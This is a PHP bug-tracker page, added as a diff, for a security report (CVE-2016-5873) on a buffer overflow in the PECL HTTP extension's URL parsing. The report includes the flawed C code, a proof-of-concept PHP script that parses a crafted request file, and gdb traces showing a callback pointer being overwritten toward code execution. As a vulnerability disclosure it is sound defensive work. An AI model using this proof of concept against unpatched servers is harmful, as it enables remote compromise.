@@ -1,0 +1,375 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    
+        <link rel='alternate' type='application/rss+xml' title='HTTP related Bug #71719 - RDF' href='rss/bug.php?id=71719'>
+        <link rel='alternate' type='application/rss+xml' title='HTTP related Bug #71719 - RSS 2.0' href='rss/bug.php?id=71719&format=rss2'>
+        <base href="https://bugs.php.net/">
+    <title>PHP :: Sec Bug #71719 :: Buffer overflow in HTTP url parsing functions</title>
+    <link rel="shortcut icon" href="https://bugs.php.net/images/favicon.ico">
+    <link rel="stylesheet" href="https://bugs.php.net/css/style.css">
+</head>
+
+<body>
+
+<table id="top" class="head" cellspacing="0" cellpadding="0">
+    <tr>
+        <td class="head-logo">
+            <a href="/"><img src="images/logo.png" alt="Bugs" vspace="2" hspace="2"></a>
+        </td>
+
+        <td class="head-menu">
+            <a href="https://php.net/">php.net</a>&nbsp;|&nbsp;
+            <a href="https://php.net/support.php">support</a>&nbsp;|&nbsp;
+            <a href="https://php.net/docs.php">documentation</a>&nbsp;|&nbsp;
+            <a href="report.php">report a bug</a>&nbsp;|&nbsp;
+            <a href="search.php">advanced search</a>&nbsp;|&nbsp;
+            <a href="search-howto.php">search howto</a>&nbsp;|&nbsp;
+            <a href="stats.php">statistics</a>&nbsp;|&nbsp;
+            <a href="random">random bug</a>&nbsp;|&nbsp;
+            <a href="login.php">login</a>
+        </td>
+    </tr>
+
+    <tr>
+        <td class="head-search" colspan="2">
+            <form method="get" action="search.php">
+                <p class="head-search">
+                    <input type="hidden" name="cmd" value="display">
+                    <small>go to bug id or search bugs for</small>
+                    <input class="small" type="text" name="search_for" value="" size="30">
+                    <input type="image" src="images/small_submit_white.gif" alt="search" style="vertical-align: middle;">
+                </p>
+            </form>
+        </td>
+    </tr>
+</table>
+
+<table class="middle" cellspacing="0" cellpadding="0">
+    <tr>
+        <td class="content">
+<div id="bugheader">
+    <table id="details">
+        <tr id="title">
+            <th class="details" id="number"><a href="bug.php?id=71719">Sec Bug</a>&nbsp;#71719</th>
+            <td id="summary" colspan="5">Buffer overflow in HTTP url parsing functions</td>
+        </tr>
+        <tr id="submission">
+            <th class="details">Submitted:</th>
+            <td style="white-space: nowrap;">2016-03-05 20:48 UTC</td>
+            <th class="details">Modified:</th>
+            <td style="white-space: nowrap;">2016-10-05 06:29 UTC</td>
+            <td rowspan="6">
+
+
+            </td>
+        </tr>
+
+        <tr id="submitter">
+            <th class="details">From:</th>
+            <td>hlt99 &#x61;&#116; blinkenshell &#x64;&#111;&#x74; org</td>
+            <th class="details">Assigned:</th>
+            <td><a href="search.php?cmd=display&amp;assign=mike">mike</a> (<a href="https://people.php.net/mike">profile</a>)</td>
+        </tr>
+
+        <tr id="categorization">
+            <th class="details">Status:</th>
+            <td>Closed</td>
+            <th class="details">Package:</th>
+            <td><a href="search.php?cmd=display&amp;package_name[]=HTTP+related">HTTP related</a></td>
+        </tr>
+
+        <tr id="situation">
+            <th class="details">PHP Version:</th>
+            <td>7.0.4</td>
+            <th class="details">OS:</th>
+            <td>Linux</td>
+        </tr>
+
+        <tr id="private">
+            <th class="details">Private report:</th>
+            <td>No</td>
+            <th class="details">CVE-ID:</th>
+            <td><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5873" target="_blank">2016-5873</a></td>
+        </tr>
+    </table>
+</div>
+
+<div class="controls">
+<span id='control_0' class='control active'>View</span>
+<span id='control_3' class='control'><a href='bug.php?id=71719&amp;edit=3'>Add Comment</a></span>
+<span id='control_1' class='control'><a href='bug.php?id=71719&amp;edit=1'>Developer</a></span>
+<span id='control_2' class='control'><a href='bug.php?id=71719&amp;edit=2'>Edit</a></span>
+</div>
+<div class="clear"></div>
+
+
+
+<div class='comment type_comment' ><a name="1457210923">&nbsp;</a><strong>[2016-03-05 20:48 UTC] hlt99 &#x61;&#116; blinkenshell &#x64;&#111;&#x74; org</strong>
+<pre class='note'>Description:
+------------
+The url parsing functions of the PECL HTTP extension allow overflowing
+a buffer with data originating from an arbitrary HTTP request. Affected
+are the parse_*() functions in php_http_url.c that are called from within
+php_http_url_parse(). Other parsing functions were not tested but might
+be affected as well.
+The problem occurs when non-printable characters contained in an URL are
+converted into percent-encoding. The state-&gt;offset used in these functions
+is incremented without sufficient checks regarding the size of the allocated
+state-&gt;buffer.
+
+Example from parse_mb() in php_http_url.c:781:
+
+    static size_t parse_mb(struct parse_state *state, ...)
+    {
+    [...]
+        } else {
+                    int i = 0;
+
+                    PHP_HTTP_DUFF(consumed,
+                            state-&gt;buffer[state-&gt;offset++] = '%';
+                            state-&gt;buffer[state-&gt;offset++] = parse_xdigits[((unsigned char) ptr[i]) &gt;&gt; 4];
+                            state-&gt;buffer[state-&gt;offset++] = parse_xdigits[((unsigned char) ptr[i]) &amp; 0xf];
+                            ++i;
+                    );
+                }
+    [...]
+
+A php_stream_ops structure is stored in memory adjacent to the state-&gt;buffer. This struct holds valid callback function pointers for stdio-like functions (see php_streams.h:118).
+During my tests it was possible to modify one of these function pointers, get it called and execute absolutely unrelated instructions within the php binary. 
+Thus I believe it's possible to use the described flaw to execute arbitrary code.
+
+
+# PoC
+
+    $ cat http_message_parse.php
+    /*
+            http_message_parse.php
+            poc.req:
+            <a href="http://hlt99.blinkenshell.org/php/poc.req" rel="nofollow">http://hlt99.blinkenshell.org/php/poc.req</a>
+    */
+    &lt;?php
+    	$http_msg = new http\Message(file_get_contents(&quot;poc.req&quot;), false);
+    ?&gt;
+
+    $ ./configure --enable-mysqlnd --enable-soap --with-openssl --with-sqlite3 --enable-raphf --enable-propro --with-http --with-zlib-dir --enable-zip --enable-intl &amp;&amp; make
+
+    $ gdb ./sapi/cli/php
+    gdb&gt; b streams.c:467
+    gdb&gt; r http_message_parse.php
+    [...]
+    RAX: 0x10031c0 --&gt; 0x794560 (&lt;php_stdiop_write&gt;)
+            ^-- !! original callback function pointer
+    RBX: 0x7ffff1870300
+    RCX: 0x1 
+    RDX: 0x7ffff1871078 
+    RSI: 0x1 
+    RDI: 0x7ffff1870300
+    RBP: 0x3 
+    RSP: 0x7fffffffab30 
+    RIP: 0x78f5b4 (&lt;_php_stream_free+308&gt;:	call   QWORD PTR [rax+0x10])
+    R8 : 0x1 
+    R9 : 0x0 
+    R10: 0x74000 
+    R11: 0x1 
+    R12: 0x0 
+    R13: 0x102ea40 --&gt; 0x0 
+    R14: 0x0 
+    R15: 0x0
+    EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
+    [-------------------------------------code-------------------------------------]
+    =&gt; 0x78f5b4 &lt;_php_stream_free+308&gt;:	call   QWORD PTR [rax+0x10]
+    [------------------------------------------------------------------------------]
+    0x000000000078f5b4	467			ret = stream-&gt;ops-&gt;close(stream, preserve_handle ? 0 : 1);
+    
+    gdb&gt; c
+    RAX: 0x1004130 --&gt; 0x82f490 (&lt;ZEND_ADD_SPEC_TMPVAR_CONST_HANDLER&gt;)
+            ^-- !! lower 3 bytes overwritten (halfbyte at offset 0x3f converted to hex char
+                !! and byte at offset 0x40 in poc.req
+                !! plus trailing 0x00 inserted by url parsing functions)
+    RBX: 0x7ffff1870400
+    RCX: 0x1 
+    RDX: 0x2 
+    RSI: 0x1 
+    RDI: 0x7ffff1870400
+    RBP: 0xb ('\x0b')
+    RSP: 0x7fffffffa8a0
+    RIP: 0x78f5b4 (&lt;_php_stream_free+308&gt;:	call   QWORD PTR [rax+0x10])
+    R8 : 0x1 
+    R9 : 0x0 
+    R10: 0x682f377068702f73 ('s/php7/h')
+    R11: 0x170 
+    R12: 0x0 
+    R13: 0x102ea40 --&gt; 0x0 
+    R14: 0x0 
+    R15: 0x0
+    EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
+    [-------------------------------------code-------------------------------------]
+    =&gt; 0x78f5b4 &lt;_php_stream_free+308&gt;:	call   QWORD PTR [rax+0x10] 
+    [------------------------------------------------------------------------------]
+    0x000000000078f5b4	467			ret = stream-&gt;ops-&gt;close(stream, preserve_handle ? 0 : 1);
+
+    gdb&gt; c
+    Program received signal SIGSEGV, Segmentation fault.
+    [----------------------------------registers-----------------------------------]
+    RAX: 0x1004130 --&gt; 0x82f490 (&lt;ZEND_ADD_SPEC_TMPVAR_CONST_HANDLER&gt;)
+    RBX: 0x7ffff1870400
+    RCX: 0x1 
+    RDX: 0x2 
+    RSI: 0x1 
+    RDI: 0x7ffff1870400
+    RBP: 0xb ('\x0b')
+    RSP: 0x7fffffffa880
+    RIP: 0x82f346 (&lt;ZEND_ADD_SPEC_TMPVAR_TMPVAR_HANDLER+6&gt;:    movsxd rbx,DWORD PTR [r15+0x8])
+    R8 : 0x1 
+    R9 : 0x0 
+    R10: 0x682f377068702f73 ('s/php7/h')
+    R11: 0x170 
+    R12: 0x0 
+    R13: 0x102ea40 --&gt; 0x0 
+    R14: 0x0 
+    R15: 0x0
+    EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
+    [-------------------------------------code-------------------------------------]
+       0x82f340 &lt;ZEND_ADD_SPEC_TMPVAR_TMPVAR_HANDLER&gt;:    push   rbp
+       0x82f341 &lt;ZEND_ADD_SPEC_TMPVAR_TMPVAR_HANDLER+1&gt;:    push   rbx
+       0x82f342 &lt;ZEND_ADD_SPEC_TMPVAR_TMPVAR_HANDLER+2&gt;:    sub    rsp,0x8
+    =&gt; 0x82f346 &lt;ZEND_ADD_SPEC_TMPVAR_TMPVAR_HANDLER+6&gt;:    movsxd rbx,DWORD PTR [r15+0x8]
+    [------------------------------------------------------------------------------]
+    Stopped reason: SIGSEGV
+    ZEND_ADD_SPEC_TMPVAR_TMPVAR_HANDLER () at /home/rc0r/tmp/php-src/Zend/zend_vm_execute.h:44295
+    44295        op1 = _get_zval_ptr_var(opline-&gt;op1.var, execute_data, &amp;free_op1);
+      ^-- !! crash during execution of arbitrary callback function !!
+    
+    /*** Backtrace right after overflow, before modified fn ptrs are called ***/
+
+    gdb&gt; b php_http_url.c:1514
+    gdb&gt; dis 1
+    gdb&gt; r
+    Breakpoint 2, php_http_url_parse (
+    str=str@entry=0x7ffff185da05 &quot;5 HTTP/1.1\nA\265_eptA eg&quot;, '\262' &lt;repeats 20 times&gt;, &quot;ղ&quot;, '\262' &lt;repeats 14 times&gt;, &quot;\260\260A HTTP/1.1\nA\265_eptABCDEFGHI&quot;, '\262' &lt;repeats 25 times&gt;, &quot;TTP//X-Csrf-Token:1.0  HTTP/\215.0&quot;, len=len@entry=0x1, flags=flags@entry=0xffffffff)
+    at /home/rc0r/tmp/php-src/ext/http/src/php_http_url.c:1514
+    1514		if (!parse_hier(state)) {
+    gdb&gt; bt
+    #0  php_http_url_parse (
+        str=str@entry=0x7ffff185da05 &quot;5 HTTP/1.1\nA\265_eptA eg&quot;, '\262' &lt;repeats 20 times&gt;, &quot;ղ&quot;, '\262' &lt;repeats 14 times&gt;, &quot;\260\260A HTTP/1.1\nA\265_eptABCDEFGHI&quot;, '\262' &lt;repeats 25 times&gt;, &quot;TTP//X-Csrf-Token:1.0  HTTP/\215.0&quot;, len=len@entry=0x1, flags=flags@entry=0xffffffff)
+        at /home/rc0r/tmp/php-src/ext/http/src/php_http_url.c:1514
+    #1  0x0000000000736bf1 in php_http_info_parse (info=info@entry=0x7fffffffaa20, 
+        pre_header=0x7ffff185da00 &quot;\200\254Td 5 HTTP/1.1\nA\265_eptA eg&quot;, '\262' &lt;repeats 20 times&gt;, &quot;ղ&quot;, '\262' &lt;repeats 14 times&gt;, &quot;\260\260A HTTP/1.1\nA\265_eptABCDEFGHI&quot;, '\262' &lt;repeats 25 times&gt;, &quot;TTP//X-Csrf-Token:1.0  HTTP/\215.0&quot;)
+        at /home/rc0r/tmp/php-src/ext/http/src/php_http_info.c:138
+    #2  0x0000000000735838 in php_http_header_parser_parse (parser=parser@entry=0x7fffffffaa00, buffer=buffer@entry=0x7fffffffa9d0, 
+        flags=flags@entry=0x1, headers=0x7ffff1882090, callback_func=0x73a670 &lt;php_http_message_info_callback&gt;, 
+        callback_arg=callback_arg@entry=0x7fffffffa9c8) at /home/rc0r/tmp/php-src/ext/http/src/php_http_header_parser.c:151
+    #3  0x0000000000740644 in php_http_message_parser_parse (parser=parser@entry=0x7fffffffaa00, buffer=buffer@entry=0x7fffffffa9d0, flags=0x1, 
+        message=message@entry=0x7fffffffa9c8) at /home/rc0r/tmp/php-src/ext/http/src/php_http_message_parser.c:249
+    #4  0x000000000073ba48 in php_http_message_parse (msg=0x7ffff1882070, msg@entry=0x0, 
+        str=str@entry=0x7ffff185d8d8 &quot;\200\254Td 5 HTTP/1.1\nA\265_eptA eg&quot;, '\262' &lt;repeats 20 times&gt;, &quot;ղ&quot;, '\262' &lt;repeats 14 times&gt;, &quot;\260\260A HTTP/1.1\nA\265_eptABCDEFGHI&quot;, '\262' &lt;repeats 25 times&gt;, &quot;TTP//X-Csrf-Token:1.0  HTTP/\215.0&quot;, len=&lt;optimized out&gt;, greedy=&lt;optimized out&gt;)
+        at /home/rc0r/tmp/php-src/ext/http/src/php_http_message.c:134
+    #5  0x000000000073c82d in zim_HttpMessage___construct (execute_data=&lt;optimized out&gt;, return_value=&lt;optimized out&gt;)
+        at /home/rc0r/tmp/php-src/ext/http/src/php_http_message.c:1061
+    #6  0x00000000008560f2 in ZEND_DO_FCALL_SPEC_HANDLER () at /home/rc0r/tmp/php-src/Zend/zend_vm_execute.h:842
+    #7  0x000000000081273b in execute_ex (ex=&lt;optimized out&gt;) at /home/rc0r/tmp/php-src/Zend/zend_vm_execute.h:414
+    #8  0x0000000000864567 in zend_execute (op_array=0x7ffff187d000, op_array@entry=0x7ffff185d860, return_value=return_value@entry=0x7ffff1813030)
+        at /home/rc0r/tmp/php-src/Zend/zend_vm_execute.h:458
+    #9  0x00000000007d4ee4 in zend_execute_scripts (type=type@entry=0x8, retval=0x7ffff1813030, retval@entry=0x0, file_count=file_count@entry=0x3)
+        at /home/rc0r/tmp/php-src/Zend/zend.c:1427
+    #10 0x0000000000778b90 in php_execute_script (primary_file=primary_file@entry=0x7fffffffd260) at /home/rc0r/tmp/php-src/main/main.c:2487
+    #11 0x0000000000866194 in do_cli (argc=0x2, argv=0x10448c0) at /home/rc0r/tmp/php-src/sapi/cli/php_cli.c:974
+    #12 0x0000000000443b98 in main (argc=0x2, argv=0x10448c0) at /home/rc0r/tmp/php-src/sapi/cli/php_cli.c:1350
+
+Expected result:
+----------------
+Error/exception indicating an invalid HTTP request
+
+Actual result:
+--------------
+Segmentation fault
+
+</pre>
+</div><h2>Patches</h2>
+<p><a href='patch-add.php?bug_id=71719'>Add a Patch</a></p><h2>Pull Requests</h2>
+<p><a href='gh-pull-add.php?bug_id=71719'>Add a Pull Request</a></p><h2 style="border-bottom:2px solid #666;margin-bottom:0;padding:5px 0;">History</h2><div id='comment_filter' class='controls comments'><span id='type_all' class='control active' onclick='do_comment(this);'>All</span><span id='type_comment' class='control ' onclick='do_comment(this);'>Comments</span><span id='type_log' class='control ' onclick='do_comment(this);'>Changes</span><span id='type_svn' class='control ' onclick='do_comment(this);'>Git/SVN commits</span><span id='type_related' class='control ' onclick='do_comment(this);'>Related reports</span>            </div>
+            <div id='comments_view' style='clear:both;'>
+<div class='comment type_log' ><a name="1457450751">&nbsp;</a><strong>[2016-03-08 15:25 UTC] <a href="//people.php.net/johannes">johannes@php.net</a></strong>
+<div class='log_note'><div class="changeset">
+<span class="removed">-Status:      Open</span>
+<span class="added">+Status:      Assigned</span>
+<span class="removed">-Assigned To:</span>
+<span class="added">+Assigned To: mike</span>
+</div></div></div><div class='comment type_comment' ><a name="1457513326">&nbsp;</a><strong>[2016-03-09 08:48 UTC] <a href="//people.php.net/mike">mike@php.net</a></strong>
+<pre class='note'>Thanks for the report!
+
+Releases with the fix are planned for today.
+</pre>
+</div><div class='comment type_log' ><a name="1457513339">&nbsp;</a><strong>[2016-03-09 08:48 UTC] <a href="//people.php.net/mike">mike@php.net</a></strong>
+<div class='log_note'><div class="changeset">
+<span class="removed">-Status: Assigned</span>
+<span class="added">+Status: Closed</span>
+</div></div></div><div class='comment type_comment' ><a name="1468354967">&nbsp;</a><strong>[2016-07-12 20:22 UTC] hlt99 &#x61;&#116; blinkenshell &#x64;&#111;&#x74; org</strong>
+<pre class='note'>CVE-2016-5873 was assigned for the original cause of the reported problem as summarized in the following commit:
+
+<a href="https://github.com/m6w6/ext-http/commit/3724cd76a28be1d6049b5537232e97ac567ae1f5" rel="nofollow">https://github.com/m6w6/ext-http/commit/3724cd76a28be1d6049b5537232e97ac567ae1f5</a>
+</pre>
+</div><div class='comment type_log' ><a name="1475596278">&nbsp;</a><strong>[2016-10-04 15:51 UTC] <a href="//people.php.net/mike">mike@php.net</a></strong>
+<div class='log_note'><div class="changeset">
+<span class="removed">-Type: Security</span>
+<span class="added">+Type: Bug</span>
+</div></div></div><div class='comment type_log' ><a name="1475648780">&nbsp;</a><strong>[2016-10-05 06:26 UTC] <a href="//people.php.net/remi">remi@php.net</a></strong>
+<div class='log_note'><div class="changeset">
+<span class="removed">-CVE-ID:</span>
+<span class="added">+CVE-ID: 2016-5873</span>
+</div></div></div><div class='comment type_log' ><a name="1475648949">&nbsp;</a><strong>[2016-10-05 06:29 UTC] <a href="//people.php.net/mike">mike@php.net</a></strong>
+<div class='log_note'><div class="changeset">
+<span class="removed">-Type: Bug</span>
+<span class="added">+Type: Security</span>
+</div></div></div></div>
+        </td>
+    </tr>
+</table>
+
+<script src='js/util.js'></script>
+<script src='https://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js'></script>
+<script src="js/jquery.cookie.js"></script>
+<script>
+function do_comment(nd)
+{
+    $('#comment_filter > .control.active').removeClass("active");
+    $(nd).addClass("active");
+
+    $.cookie('history_tab', nd.id, { expires: 365 });
+
+    if (nd.id == 'type_all') {
+        $('#comments_view > .comment:hidden').show('slow');
+    } else {
+        $('#comments_view > .comment').each(function(i) {
+            if ($(this).hasClass(nd.id)) {
+                $(this).show('slow');
+            } else {
+                $(this).hide('slow');
+            }
+        });
+    }
+    return false;
+}
+</script>
+<table class="foot" cellspacing="0" cellpadding="0">
+    <tr>
+        <td class="foot-bar" colspan="2">&nbsp;</td>
+    </tr>
+
+    <tr>
+        <td class="foot-copy">
+            <small>
+                <a href="https://php.net/"><img src="images/logo-small.gif" align="left" valign="middle" hspace="3" alt="PHP"></a>
+                <a href="https://php.net/copyright.php">Copyright &copy; 2001-2021 The PHP Group</a><br>
+                All rights reserved.
+            </small>
+        </td>
+        <td class="foot-source">
+            <small>Last updated: Sat Oct 30 19:03:34 2021 UTC</small>
+        </td>
+    </tr>
+</table>
+</body>
+</html>
